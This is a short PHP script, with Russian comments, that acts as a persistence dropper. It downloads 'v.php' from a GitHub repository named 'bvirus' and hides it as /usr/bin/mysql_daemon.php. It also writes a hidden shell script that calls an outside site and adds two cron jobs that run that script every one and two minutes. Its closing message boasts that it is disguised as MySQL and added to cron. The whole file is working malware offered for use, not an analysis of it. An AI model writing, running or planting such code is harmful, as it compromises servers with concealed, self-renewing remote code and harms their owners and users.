<?php
// Check if script is in cron
$current_script = __FILE__;
exec('crontab -l', $cron_lines, $return_var);
$in_cron = false;
if ($return_var === 0) {
    foreach ($cron_lines as $line) {
        if (strpos($line, basename($current_script)) !== false || strpos($line, $current_script) !== false) {
            $in_cron = true;
            break;
        }
    }
}
if (!$in_cron) {
    // Download from git
    $git_url = 'https://raw.githubusercontent.com/sotmk777/bvirus/master/v.php';
    $temp_script = '/tmp/.mysql_daemon.php';
    exec("curl -s $git_url -o $temp_script");
    // Copy to MySQL location
    $mysql_path = '/usr/bin/mysql_daemon.php';
    if (file_exists($temp_script)) {
        copy($temp_script, $mysql_path);
        unlink($temp_script);
        chmod($mysql_path, 0755);
        $current_script = $mysql_path;
    }
}
// Путь к файлу
$bashScriptPath = dirname(__FILE__) . "/.mysql.sh";

$scriptLines = [
    "#!/bin/bash",
    "# MySQL daemon helper script",
    "curl -s https://kwork.ru >> /tmp/mysql.log",
    "echo 'MySQL daemon check: $(date)' >> /tmp/mysql.log"
];

// Объединяем строки с переводом строки
$scriptContent = implode("\n", $scriptLines);

file_put_contents($bashScriptPath, $scriptContent);

// Делаем файл исполняемым
chmod($bashScriptPath, 0755);

// Добавляем две задачи в крон
$cron_line1 = "*/1 * * * * " . escapeshellcmd($bashScriptPath) . "\n";
$cron_line2 = "*/2 * * * * " . escapeshellcmd($bashScriptPath) . "\n";

// Добавляем новые задачи без проверки
exec("(crontab -l; echo " . escapeshellarg($cron_line1) . "; echo " . escapeshellarg($cron_line2) . ") | crontab -");

echo "Скрипт замаскирован под MySQL и добавлен в крон.\n";